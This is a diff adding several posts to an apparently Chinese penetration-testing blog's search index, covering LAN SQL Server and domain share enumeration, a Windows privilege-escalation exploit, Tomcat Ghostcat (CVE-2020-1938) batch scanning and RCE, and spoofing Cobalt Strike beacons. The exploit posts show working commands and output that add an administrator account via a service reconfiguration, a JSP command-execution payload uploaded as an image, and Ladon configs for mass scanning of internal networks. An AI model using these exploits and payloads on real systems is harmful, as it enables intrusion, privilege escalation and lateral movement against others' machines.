@@ -1223,6 +1223,328 @@
       </tags>
   </entry>
   <entry>
+    <title>利用SqlDataSourceEnumerator获取局域网SQL主机</title>
+    <url>/p/61471.html</url>
+    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>SQL Server 允许应用程序在当前网络中查找 SQL Server 实例。 SqlDataSourceEnumerator 类向应用程序开发人员公开此信息，提供包含所有可见服务器的信息的 DataTable。 此返回的表包含网络上可用的服务器实例的列表，该列表与用户尝试创建新连接时提供的列表匹配，并展开包含连接属性上所有可用服务器的下拉列表。对话框。 显示的结果并非总是完整的。</p>
+<h3 id="SqlDataSourceEnumerator"><a href="#SqlDataSourceEnumerator" class="headerlink" title="SqlDataSourceEnumerator"></a>SqlDataSourceEnumerator</h3><p>命名空间: System.Data.Sql<br>程序集: System.Data.dll</p>
+<p>提供了一种枚举本地网络内的所有可用 SQL Server 实例的机制。</p>
+<p>通过方法调用返回的表包含以下列，所有列均包含 string 值：<br>列     描述<br>ServerName     服务器的名称。<br>InstanceName     服务器实例的名称。 如果服务器作为默认实例运行，则为空白。<br>IsClustered     指示服务器是否属于群集。<br>Version     服务器的版本。 例如:</p>
+<p>-9.00 （SQL Server 2005）<br>-10.0. xx （SQL Server 2008）<br>-10.50 （SQL Server 2008 R2）<br>-11.0. xx （SQL Server 2012）</p>
+<h3 id="C-示例代码"><a href="#C-示例代码" class="headerlink" title="C#示例代码"></a>C#示例代码</h3><p>.NET与PowerShell谁的兼容性和执行效率更好就不用我说了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using System.Data.Sql;  </span><br><span class="line">  </span><br><span class="line">class Program  </span><br><span class="line">&#123;  </span><br><span class="line">  static void Main()  </span><br><span class="line">  &#123;  </span><br><span class="line">    &#x2F;&#x2F; Retrieve the enumerator instance and then the data.  </span><br><span class="line">    SqlDataSourceEnumerator instance &#x3D;  </span><br><span class="line">      SqlDataSourceEnumerator.Instance;  </span><br><span class="line">    System.Data.DataTable table &#x3D; instance.GetDataSources();  </span><br><span class="line">  </span><br><span class="line">    &#x2F;&#x2F; Display the contents of the table.  </span><br><span class="line">    DisplayData(table);  </span><br><span class="line">  </span><br><span class="line">    Console.WriteLine(&quot;Press any key to continue.&quot;);  </span><br><span class="line">    Console.ReadKey();  </span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">  private static void DisplayData(System.Data.DataTable table)  </span><br><span class="line">  &#123;  </span><br><span class="line">    foreach (System.Data.DataRow row in table.Rows)  </span><br><span class="line">    &#123;  </span><br><span class="line">      foreach (System.Data.DataColumn col in table.Columns)  </span><br><span class="line">      &#123;  </span><br><span class="line">        Console.WriteLine(&quot;&#123;0&#125; &#x3D; &#123;1&#125;&quot;, col.ColumnName, row[col]);  </span><br><span class="line">      &#125;  </span><br><span class="line">      Console.WriteLine(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="PowerShell命令"><a href="#PowerShell命令" class="headerlink" title="PowerShell命令"></a>PowerShell命令</h3><p>系统未安装或禁用PowerShell会失效，但也比国人故意吹捧的PowerUPSQL好很多倍。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\k8gege\Desktop&gt;PowerShell -Command <span class="string">"[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()"</span></span><br><span class="line"></span><br><span class="line">ServerName          InstanceName        IsClustered         Version</span><br><span class="line">----------          ------------        -----------         -------</span><br><span class="line">K82003-77562E10</span><br><span class="line">WIN-OLDM1T2H9M4</span><br></pre></td></tr></table></figure>
+
+<h3 id="PowerUPSQL"><a href="#PowerUPSQL" class="headerlink" title="PowerUPSQL"></a>PowerUPSQL</h3><p>此工具也是基于SqlDataSourceEnumerator实现的，兼容性较差，很多系统下运行各种报错。</p>
+<pre><code class="Bash">PS C:\Users\k8gege\Desktop\PowerUpSQL-master&gt; Get-SQLInstanceBroadcast -Verbose
+详细信息: Attempting to identify SQL Server instances on the broadcast domain.
+详细信息: 2 SQL Server instances were found.
+
+ComputerName                        Instance                           IsClustered                        Version                           
+------------                        --------                           -----------                        -------                           
+K82003-77562E10                     K82003-77562E10                                                                                         
+WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
+<h3 id="Ladon-EnumMssql"><a href="#Ladon-EnumMssql" class="headerlink" title="Ladon EnumMssql"></a>Ladon EnumMssql</h3><p>Ladon的EnumMssql模块不支持扫描，若内网存在多个网段，可使用PortScan扫描探测。<br><img alt="img" data-original="https://camo.githubusercontent.com/2e97e127bfc1acd625ee289dbfaf4b3ffd307bd7/68747470733a2f2f6b38676567652e6769746875622e696f2f6b38696d672f4c61646f6e2f63732f43535f456e756d4d5353514c2e676966"></p>
+<p>Ladon与PowerUPSQL对比，Ladon支持任意Win系统，而PowerUPSQL就未必能用了<br><img alt="img" data-original="https://camo.githubusercontent.com/73b58a071a70adf62dc7f4aecd1dff48d8e5df40/68747470733a2f2f6b38676567652e6769746875622e696f2f6b38696d672f4c61646f6e2f6578652f456e756d4d5353514c2e676966"></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/framework/data/adonet/sql/enumerating-instances-of-sql-server" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/framework/data/adonet/sql/enumerating-instances-of-sql-server</a></p>
+]]></content>
+      <categories>
+        <category>Ladon</category>
+        <category>信息收集</category>
+        <category>主机发现</category>
+      </categories>
+      <tags>
+        <tag>Ladon</tag>
+        <tag>.NET</tag>
+        <tag>SQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows提权工具 CVE-2019-1405 &amp; CVE-2019-1322</title>
+    <url>/p/19321.html</url>
+    <content><![CDATA[<h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>由NCC Group研究人员所发现的两个通过COM本地服务进行非法提权的漏洞。第一个漏洞CVE-2019-1405是COM服务中的一个逻辑错误，可让本地普通用户以LOCAL SERVICE身份执行任意命令。第二个漏洞CVE-2019-1322是一个简单的服务配置错误，可让本地SERVICE组中的任何用户重新配置以SYSTEM权限运行的服务（此漏洞也被其他研究人员发现）。当以上两个漏洞结合在一起时，就允许本地普通用户以SYSTEM权限执行任意命令。</p>
+<p>全面检查了一些Windows服务,发现以LOCAL SERVICE或NETWORK SERVICE运行的所有用户都可以执行这种攻击。其中就包括前面我们提到的UPnP Device Host服务,这样我们就能以本地任意用户身份,结合使用CVE-2019-1405及CVE-2019-1322这两个漏洞,成功在Windows 10(1803到1903)系统上将权限提升至SYSTEM用户。</p>
+<h3 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>Vendor     Product     Versions<br>Microsoft    Windows 10    -, 1607, 1709, 1803, 1809, 1903<br>Microsoft    Windows 7    -<br>Microsoft    Windows 8.1    -<br>Microsoft    Windows Rt 8.1    -<br>Microsoft    Windows Server 2008    -, R2<br>Microsoft    Windows Server 2012    -, R2<br>Microsoft    Windows Server 2016    -, 1803, 1903<br>Microsoft    Windows Server 2019    -</p>
+<h3 id="默认提权"><a href="#默认提权" class="headerlink" title="默认提权"></a>默认提权</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\null\Desktop&gt;COMahawk64.exe</span><br><span class="line">[\] Progress:  1/9 2/9 3/9 4/9 5/9 6/9 7/9 8/9 9/9</span><br><span class="line">[+] Hopefully k8gege:K8gege520 is added as an admin.</span><br><span class="line"></span><br><span class="line">C:\Users\null\Desktop&gt;net user</span><br><span class="line"></span><br><span class="line">\\DESKTOP-3F42O5D 的用户帐户</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            DefaultAccount           Guest</span><br><span class="line">k8gege                   null                     WDAGUtilityAccount</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
+
+<h3 id="指定命令"><a href="#指定命令" class="headerlink" title="指定命令"></a>指定命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\null\Desktop&gt;COMahawk64.exe <span class="string">"net user k8gege K8gege123? /add"</span></span><br><span class="line">[+] Executing <span class="built_in">command</span> [ sc config UsoSvc binpath= <span class="string">"cmd.exe /c net user k8gege K8gege123? /add"</span> ]</span><br><span class="line">[\] Progress:  1/6 2/6 3/6 4/6 5/6 6/6</span><br><span class="line">[+] Command executed.</span><br><span class="line">C:\Users\null\Desktop&gt;net user</span><br><span class="line"></span><br><span class="line">\\DESKTOP-3F42O5D 的用户帐户</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            DefaultAccount           Guest</span><br><span class="line">k8gege                   null                     WDAGUtilityAccount</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
+
+<h3 id="Win10提权"><a href="#Win10提权" class="headerlink" title="Win10提权"></a>Win10提权</h3><p>Teston Win10 X64 1803<br><img data-original="http://k8gege.org/k8img/LPE/COMahawk.PNG"></p>
+<h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><p><a href="https://github.com/apt69/COMahawk" target="_blank" rel="noopener">https://github.com/apt69/COMahawk</a></p>
+<p><a href="https://github.com/k8gege/K8tools/raw/master/Comahawk.rar" target="_blank" rel="noopener">https://github.com/k8gege/K8tools/raw/master/Comahawk.rar</a></p>
+]]></content>
+      <categories>
+        <category>Exp</category>
+        <category>提权</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>LPE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Ladon CVE-2020-1938跨网段、C段批量扫描内网漏洞</title>
+    <url>/p/42879.html</url>
+    <content><![CDATA[<h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>根据国家信息安全漏洞共享平台（CNVD）20日发布的Apache Tomcat文件包含漏洞（CNVD-2020-10487/CVE-2020-1938）。该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。</p>
+<h3 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h3><p>cnvd-2020-10487<br>cve-2020-1938</p>
+<h3 id="漏洞条件"><a href="#漏洞条件" class="headerlink" title="漏洞条件"></a>漏洞条件</h3><p>开放AJP端口（默认开放8009）</p>
+<h3 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>apache tomcat 6<br>apache tomcat 7 &lt; 7.0.100<br>apache tomcat 8 &lt; 8.5.51<br>apache tomcat 9 &lt; 9.0.31</p>
+<h3 id="扫描框架"><a href="#扫描框架" class="headerlink" title="扫描框架"></a>扫描框架</h3><p>Ladon设计的初衷就是一个多线程扫描框架，主要是为了让使用者能快速批量检测企业内部或外部站点漏洞<br>不管你擅长哪一门语言，只需要实现单一功能，都可以快速进行批量IP、批量URL、批量C段、批量B段等等<br>每当公开或泄露一个新漏洞时，自己要实现多现程以及批量以上功能，重写一份浪费时间，可能会错过时机<br>小内网可能自己写个批量IP.TXT就够用了，但是大的内网几百几千个网段就基本没有工具考虑，如批量C段<br>但是不要慌，无论是多线程，还是批量C段、跨网段等等，Ladon全都帮你考虑好了，只需实现单一功能即可<br>在Ladon的插件中配置INI方式是不需要具备编程能力的，只要会使用工具，即可实现批量调用，非常简单</p>
+<h3 id="Ladon配置"><a href="#Ladon配置" class="headerlink" title="Ladon配置"></a>Ladon配置</h3><p>INI配置很简单，只需要两个参数即可。Github上随便找一份EXP，以下我用的是PYTHON版。<br>两种配置方式，一种是编译成EXE丢到目标上运行的，一种是PY脚本方式执行方便本地调式</p>
+<h4 id="EXE配置"><a href="#EXE配置" class="headerlink" title="EXE配置"></a>EXE配置</h4><p>cve-2020-1938.ini</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=CVE-2020-1938.exe</span><br><span class="line">arg=-p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure>
+
+<h4 id="PY配置"><a href="#PY配置" class="headerlink" title="PY配置"></a>PY配置</h4><p>cve-2020-1938.ini</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=f:\python\python.exe</span><br><span class="line">arg=CVE-2020-1938.py -p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure>
+
+<h3 id="批量内网"><a href="#批量内网" class="headerlink" title="批量内网"></a>批量内网</h3><p>把开放8009端口的IP放进ip.txt，执行以下命令即可批量扫描<br>当然也可以不扫端口和不扫存活IP，直接ip24.txt扫描批量C段</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon cve-2020-1938.ini</span><br></pre></td></tr></table></figure>
+<p>以下为内网实战批量检测结果<br><img alt="img" data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2020-1938.png"></p>
+<h3 id="文件包含RCE"><a href="#文件包含RCE" class="headerlink" title="文件包含RCE"></a>文件包含RCE</h3><p>一定条件下可实现RCE，如有地方实现文件上传，往目标传个exec.jpg,内容如下，执行whoami</p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%out.println(<span class="keyword">new</span> java.io.BufferedReader(<span class="keyword">new</span> java.io.InputStreamReader(Runtime.getRuntime().exec(<span class="string">"whoami"</span>).getInputStream())).readLine());%&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python CVE-2020-1938.py -p 8009 -f exec.jpg 192.168.1.10 -c 1</span><br><span class="line">Getting resource at ajp13://192.168.1.10:8009/index.jsp</span><br><span class="line">----------------------------</span><br><span class="line">k82003-77562e10\administrator</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="1-更新到安全版本"><a href="#1-更新到安全版本" class="headerlink" title="1.更新到安全版本"></a>1.更新到安全版本</h4><p>Apache Tomcat 7.0.100<br>Apache Tomcat 8.5.51<br>Apache Tomcat 9.0.31</p>
+<h4 id="2-关闭AJP服务"><a href="#2-关闭AJP服务" class="headerlink" title="2.关闭AJP服务"></a>2.关闭AJP服务</h4><p>修改Tomcat配置文件Service.xml,注释掉<br><connector port="8009" protocol="AJP/1.3" redirectport="8443"></connector></p>
+<h4 id="3、配置ajp配置"><a href="#3、配置ajp配置" class="headerlink" title="3、配置ajp配置"></a>3、配置ajp配置</h4><p>配置ajp配置中的secretRequired跟secret属性来限制认证</p>
+<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
+]]></content>
+      <categories>
+        <category>Ladon</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Ladon</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>看我如何模拟Cobalt Strike上线欺骗入侵者</title>
+    <url>/p/40523.html</url>
+    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>不知道你有没有遇到过马上线却不能操作的情况，我猜当你网络卡或马写得不好时会出现这个问题<br>但是人为的你可能没遇到过，首先要欺骗你的远控，得分析你的协议，如果你的马根本不是公开的<br>网络又是好的，你刚往人家机器里种马，发现马只能上线不能操作，绝对是马有问题，不能甩锅我<br>人家都不知道你的马的通信原理，流量特征，不可能事先准备好一个程序，让你一发就欺骗你的马<br>本文主要研究CS这个APT很喜欢用的马，当然TCP的也一样原理，只要构造对应的数据包就可欺骗</p>
+<h3 id="远控术语"><a href="#远控术语" class="headerlink" title="远控术语"></a>远控术语</h3><p>Cobalt Strike采用的是B/S架构，也就是常说的HTTP协议（HTTPS加密的http，记住都是WEB就不会错了）<br>Client：客户是上帝，我们想买什么告诉服务员。就是控制端，即通过它来控制对方电脑。不叫服务端哦<br>Server：服务员，即服务端。以前常说的肉鸡，这个叫被控端不是控制端，叫做什么就做什么不就是服务？<br>中转：放在VPS，好比现在的快递，可有可无，买家直接见卖家就不需要。CS中转Teamserve就是一个WEB</p>
+<p>就是说如果你用IIS或Tomcat搭建的ASP、JSP、PHP、.NET等网站也可以做为中转，即可实现HTTP远控<br>如果CS不搞客户端，我们便可直接在浏览器上操作和控制目标机器，这就是08年这类码称为B/S架构的原因<br>CS的客户端就像我们用PY或其它语言实现模拟WEB登陆网站来操作一样，中转是WEB，那么肉鸡上线，它也<br>一样是HTTP请求来实现，WEB发包、POST提交不管怎么表达都可以，这是渗透基础，即是CS通信采用HTTP</p>
+<p>C/S架构：Clinet/Server,主要指的是TCP，客户端和服务端，即便带个中转它也还是叫CS架构<br>B/S架构: Browser/Server,主要是HTTP，无论直接通过浏览器操作，还是像CS加个中转再用客户端访问<br>RAT：Remote Admin Tools，远程管理工具，长期以来国内外通用叫法。<br>C2: 老外的新名词，command&amp;control，从字面上就很好理解命令和控制，不管任何协议马都可这样叫<br>这种叫法对于不够专业的人来说不会错，因为他根本不需要了解远控到底用什么协议实现，反正都叫C2</p>
+<p>当然无论是以前还是现在叫RAT也绝对不会错，叫RAT可能更专业一点，RAT像老戏骨，C2像小鲜肉<br>看看现在好多远控基本都有CMD和文件管理，甚至只是一个SHELL而已了，我猜这就是C2的由来吧<br>以前像这样一般只称为后门，随便找一个远控都有CMD、文件管理、屏幕控制、键盘记录等功能<br>而现在一个CMD和文件管理，在10几年前也很难称为马叫炮灰，现在搞个炮灰一堆BUG还以为很吊<br>以前只能称为后门，连远控都称不上的，现在只实现了一个CMD执行命令，就说成自己写个远控了<br>多台机器管理实现不了先不说，只能一对一，断以后就无法控制，连后门都不合格，还TM说成远控</p>
+<p>PS：之所以写这一段话，主要是发现不少写马的或渗透的，竟然都分不清楚服务端和控制端</p>
+<h4 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h4><p>还有我说HTTP协议(含HTTP/S)，还有人说不是HTTP还有HTTPS（首先搞清楚HTTPS是什么，加密的HTTP）<br>比方说你设计一个HTTP经过特定格式加密，单纯HTTP访问得不到真实数据而已，解不了就不属于HTTP了？<br>当有一天大家都觉得这个加密好用或安全，给它起个名叫KTTPS，或许可称为新协议，但本质还是HTTP协议。<br>当然可能有些人要说HTTP也属于TCP，虽说HTTP可通过TCP实现，但是两者有很大区别，通过TCP实现叫伪<br>为什么因为它不是真正的HTTP，目标WAF禁TCP的时候，TCP实现的就出不来，HTTP只要会操作WEB就行<br>HTTP比TCP多了一个，允许通过WEB操作来访问，HTTP虽是特殊的TCP，但已经完全变异成了一个新协议。</p>
+<p>就像猩猩和人，我们几乎不会说人是猩猩，只会说人是猩猩进化而来的，因为变异太多，可以以新物种定义。<br>而HTTPS和HTTP，就像戴不戴口罩，戴个口罩就TM不是人了？除了戴个口罩，你的衣食住行哪一样不是人。<br>你不戴口罩进不了小区，那你就戴口罩就能进去了啊，就像HTTPS(HTTP基础上加SSL协议就可以访问了啊)<br>HTTP不加SSL访问不了HTTPS，你就说HTTPS不属于HTTP，这和不戴口罩不让进小区，就说你不是人一样<br>本质是因为你不是人而不让你进吗？而是你不戴口罩，并不是说你不是人所以不让你出入，概念不一样。<br>所以说我们通常只说TCP协议、HTTP协议(因为已包含HTTPS在内)，至少10几年来很少听到有人说HTTPS马<br>最多只是听说这款http马也支持https，或这个webshell工具支持https站点，这个EXP支持HTTPS站点等</p>
+<h3 id="CS心跳包"><a href="#CS心跳包" class="headerlink" title="CS心跳包"></a>CS心跳包</h3><p>一般在设计远控时，我们都会对机器进行标记，比如上线特征为A<br>A对应信息已保存在本地数据库，因此想要确认机器是否还在控<br>我们只需要发送A标识给客户端，告诉它机器还在控制,即心跳包<br>而没实战过的人是每次都发送目标信息，这样很容易被目标发现</p>
+<p>下面配置好CS让其上线后，我们对服务端进行抓包，其心跳包如下<br>CS也是一样，因为是BS模式HTTP协议，它的心跳特征存在Cookie里<br>非正常cookie写法，一段很长的加密数据，可以止来判断是否中招</p>
+<p><img alt="img" data-original="http://k8gege.org/k8img/csonline/cscheat1.PNG"></p>
+<h3 id="上线验证"><a href="#上线验证" class="headerlink" title="上线验证"></a>上线验证</h3><p>使用Ladon Exp生成器可以提交WEB数据包，类似Firefox上的HackBar但更高级<br>区别在于可生成Ladon插件或独立EXE，对于不懂编程的人来说也可“编写”EXP<br><img alt="img" data-original="http://k8gege.org/k8img/csonline/cscheat2.PNG"></p>
+<p>运行LadonPoc.exe发现CS上线，执行一次就上线一次，说明思路没错<br><img alt="img" data-original="http://k8gege.org/k8img/csonline/cscheat3.gif"></p>
+<h3 id="欺骗入侵者"><a href="#欺骗入侵者" class="headerlink" title="欺骗入侵者"></a>欺骗入侵者</h3><p>假设我们在内网中发现别人的CS流量或者抓到样本，给他模拟上线，让他有得看没得吃<br>他在客户端那边只会看到机器在线，就是死活控不了，然后他就想是不是目标环境奇葩<br>还是说网络太卡或有什么问题,能上线就是不能操作，哈哈，一直在上线却啥事也不能做</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment">### Cobalt Strike Cheat by K8gege</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cscheat</span><span class="params">()</span>:</span></span><br><span class="line">	opener = urllib2.build_opener()</span><br><span class="line">	opener.addheaders.append((<span class="string">'Cookie'</span>, <span class="string">'Qk1UsVjTNpW6aR0327yD57Zkt1m6XWurvM+bR0xqOqGnXsatzGHpnccfgqmruH6dnJudEzijQhC0NCtoAxdA90rso7NAfBrfRrktO5B4FjZX6LEBxIyzEwQ71Jk1ttM8VY6luE5k+PMLk6DAmWUoGoJmvAl/qp4qreuWumv52TM='</span>))</span><br><span class="line">	res = opener.open(<span class="string">"http://192.168.1.102:800/dpixel"</span>)</span><br><span class="line">	content = res.read()</span><br><span class="line">	<span class="keyword">print</span> content</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:    </span><br><span class="line">	print(time.strftime(<span class="string">'%Y-%m-%d %X'</span>,time.localtime()))    </span><br><span class="line">	cscheat()</span><br><span class="line">	time.sleep(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img alt="img" data-original="http://k8gege.org/k8img/csonline/cscheat4.gif"></p>
+<h3 id="读取CMD指令"><a href="#读取CMD指令" class="headerlink" title="读取CMD指令"></a>读取CMD指令</h3><p>当客户端下达CMD命令时，中转TeamServer会将命令放在心跳包中，返回的结果如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">^Zd........N...&amp;....%COMSPEC%.... /C net user k8gege..AAAAAAAAAA.&lt;....g..I9.....</span><br><span class="line"></span><br><span class="line">5e5a69740000002e0000004e000000260000000925434f4d535045432500000013202f43206e6574</span><br><span class="line">2075736572206b387465616d00004141414141414141414100e488fc2a22f737b0067ac4384c4971</span><br></pre></td></tr></table></figure>
+
+<p>测试多次发现不管执行多长的命令 都会出现/C空格 和两个00加至少一个A<br>所以我们截取 2F4320 和 000041 之间的值，再解密即为CS下发的CMD命令</p>
+<p><img alt="img" data-original="http://k8gege.org/k8img/csonline/cscheat5.PNG"></p>
+<h3 id="返回CMD结果"><a href="#返回CMD结果" class="headerlink" title="返回CMD结果"></a>返回CMD结果</h3><p>将CS的命令执行结果提交到submit.php页面，即可实现回显,数据包如下</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /submit.php?id=60871 HTTP/1.1</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)</span><br><span class="line">Host: 192.168.1.102:800</span><br><span class="line">Content-Length: 68</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line">...@...</span><br><span class="line">........win-60a3b595b7m\k8gege</span><br><span class="line">................0=W1..LGCN..</span><br></pre></td></tr></table></figure>
+
+<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>通过本文我们了解了CS心跳包机制、下达指令、回显等原理，并玩弄入侵者<br>有兴趣的话，可以自行抓包实现自己的CS服务端，甚至支持对Linux的控制<br>也可以实现CS远控的密罐，把CS下达的指令提取出来，返回假的CMD命令结果<br>即能收集目标证据以及意图，还能将他玩弄于鼓掌之中，搞死他，哈哈</p>
+<p>PS：之所以有这篇文章，是因为昨晚有人在群里讨论，CS能不能支不支持Linux<br>目前CS的shellcode以及beacon(核心功能DLL)都是WINDOWS系统才能执行。<br>而CS对于Linux的控制目前仅是SSH会话，想真正支持就得自己实现服务端<br>不要说让其支持Linux，用个GO来实现，兼容全平台都可以，只是很麻烦<br>因为不开源，每一个动作都要自己去分析它的数据包，很多功能也很费时<br>其实早在去年的这个时间就想实现Linux服务端，所以抓包研究了下。<br>当时就应该有这篇文章了，只是因为忙，懒得编辑文字，后面忘了发。</p>
+]]></content>
+      <categories>
+        <category>Cobalt Strike</category>
+      </categories>
+      <tags>
+        <tag>Cobalt Strike</tag>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>利用DirectoryEntry获取域内计算机以及共享资源</title>
+    <url>/p/54132.html</url>
+    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>System.DirectoryServices.DirectoryEntry组件提供了对Active Directory的访问。本文以两个简单的小程序为例，阐述了如何利用此组件查看网络的各节点的信息。 DirectoryEntry组件提供了Path属性，根据文档，此属性指定了目录服务中用来访问对象的对象名，其格式如下：<br>protocol://servername:port number/distinguished name<br>此语句的第一部分定义了访问将使用的协议，如<br>LDAP: (Lightweight Directory Access Protocol)<br>IIS: (提供IIS元数据来读及配置Internet Infomation Server)<br>WinNT: (提供在非常有限的性能下对Windows NT域的访问)<br>NDS: (提供对Novell Directory Service的访问)<br>等等（详细信息清参考MSDN）。 </p>
+<p>因此我们构造一个DirectoryEntry实例，将它的Path设为”WinNT:”，以通过对它的所有子项的枚举来发现网络上的所有域（以及工作组）。这样，再对所发现的域（以及工作组）的子项进行枚举，就可以发现网络上的所有计算机，结合WMI发现机器上的共享资源。</p>
+<h3 id="C-实现代码"><a href="#C-实现代码" class="headerlink" title="C#实现代码"></a>C#实现代码</h3><p>以下为Ladon的EnumShare代码,自动获取当前域，并枚举域内计算机以及获取机器开放共享资源。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string strDomain;</span><br><span class="line">string strComputer;</span><br><span class="line">string strShare;</span><br><span class="line">Console.WriteLine(&quot;Load EnumShare&quot;);</span><br><span class="line"></span><br><span class="line">DirectoryEntry root &#x3D; new DirectoryEntry(&quot;WinNT:&quot;);</span><br><span class="line">foreach (DirectoryEntry Domain in root.Children)</span><br><span class="line">&#123;</span><br><span class="line">    strDomain &#x3D; Domain.Name;</span><br><span class="line">    Console.WriteLine(&quot;Domain: &quot; + strDomain);</span><br><span class="line">    foreach (DirectoryEntry Computer in Domain.Children)</span><br><span class="line">    &#123;</span><br><span class="line">        if (Computer.SchemaClassName.Equals(&quot;Computer&quot;))</span><br><span class="line">        &#123;</span><br><span class="line">            strComputer &#x3D; Computer.Name;</span><br><span class="line">            ManagementObjectSearcher searcher &#x3D; new ManagementObjectSearcher(&quot;select * from win32_share&quot;);</span><br><span class="line">            foreach (ManagementObject share in searcher.Get())</span><br><span class="line">            &#123;</span><br><span class="line">                strShare &#x3D; share[&quot;Name&quot;].ToString();</span><br><span class="line">                Console.WriteLine(strComputer + &quot;\\&quot; + strShare);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Ladon EnumShare<br>因为崇尚极简主义，所以Ladon无需填写域名以及参数，参数多也很烦，全自动获取，一步到位。<br><img alt="img" data-original="https://k8gege.org/k8img/Ladon/exe/EnumShare.PNG"></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
+<p><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.directoryservices.directoryentry?view=netframework-4.8" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/api/system.directoryservices.directoryentry?view=netframework-4.8</a></p>
+]]></content>
+      <categories>
+        <category>Ladon</category>
+        <category>.NET</category>
+        <category>源码</category>
+        <category>内网渗透</category>
+        <category>信息收集</category>
+        <category>主机发现</category>
+        <category>编程</category>
+      </categories>
+      <tags>
+        <tag>Ladon</tag>
+        <tag>.NET</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Metasploit/PowerShell内存加载执行.NET</title>
